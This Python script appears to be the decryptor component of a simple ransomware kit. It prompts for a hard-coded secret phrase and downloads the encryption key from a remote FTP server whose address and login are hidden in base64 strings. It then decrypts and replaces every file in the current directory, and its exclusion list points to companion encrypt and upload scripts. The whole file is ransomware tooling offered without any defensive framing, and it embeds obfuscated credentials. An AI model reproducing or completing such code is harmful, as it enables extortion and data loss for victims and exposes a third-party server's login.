#!/usr/bin/python3

import os
import cryptography
from cryptography.fernet import Fernet
import ftplib
import base64

# let's find some files

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py':
        continue

    if os.path.isfile(file):
        files.append(file)

secretphrase = "hacking"

def download_key():
    base64_host = "MTAwLjkwLjk1LjYK"
    base64_bytes = base64_host.encode('ascii')
    host_bytes = base64.b64decode(base64_bytes)
    host = host_bytes.decode('ascii')

    base64_username = "Y29uY2F0ZW5hdGUK"
    base64_bytes = base64_username.encode('ascii')
    username_bytes = base64.b64decode(base64_bytes)
    username = username_bytes.decode('ascii')

    base64_password = "YXJzaHNlcmkxMjMK"
    base64_bytes = base64_password.encode('ascii')
    password_bytes = base64.b64decode(base64_bytes)
    password = password_bytes.decode('ascii')

    HOSTNAME = host.strip()
    USERNAME = username.strip()
    PASSWORD = password.strip()

    # Connect to the FTP server
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)

    # force UTF-8 encoding
    ftp_server.encoding = "utf-8"

    filename = 'thekey.key'

    with open(filename, 'wb') as file:
        ftp_server.retrbinary(f'RETR {filename}', file.write)


try:
    user_phrase = input("Enter the secret phrase to decrypt your files: ")
    if user_phrase == secretphrase:
        download_key()
        with open("thekey.key", "rb") as key:
            secretkey = key.read()
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            tempTuple = os.path.splitext(file)
            os.remove(file)
            file = tempTuple[0]
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        os.remove("thekey.key")
        print("Congratulations, your files have been decrypted!")
    else:
        print("Sorry, the phrase you entered is wrong!")
except (cryptography.fernet.InvalidToken, TypeError):
    print("The files are not encrypted or there's been an unexpected error!")